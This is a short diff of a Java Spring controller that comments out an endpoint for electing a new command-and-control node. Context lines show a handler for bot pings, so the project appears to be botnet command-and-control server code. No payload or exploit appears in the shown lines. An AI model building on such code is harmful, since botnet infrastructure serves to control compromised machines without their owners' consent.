@@ -196,15 +196,15 @@ public class CommandController {
 
 	/////////////////////////////////////////////////////////////////////////
 
-	@RequestMapping(value = "/election", method = RequestMethod.GET)
-	@ResponseBody
-	public boolean startElection(HttpServletRequest req) {
-		System.out.println("Richiesta di elezione di un nuovo CeC da " + req.getRemoteAddr());
-		if (configEngine.isCommandandconquerStatus()) {
-			cmm.startElection();
-		}
-		return true;
-	}
+//	@RequestMapping(value = "/election", method = RequestMethod.GET)
+//	@ResponseBody
+//	public boolean startElection(HttpServletRequest req) {
+//		System.out.println("Richiesta di elezione di un nuovo CeC da " + req.getRemoteAddr());
+//		if (configEngine.isCommandandconquerStatus()) {
+//			cmm.startElection();
+//		}
+//		return true;
+//	}
 
 	// Controller che intercetta i ping dei bot
 	@RequestMapping(value = "/BotPing", method = RequestMethod.POST)
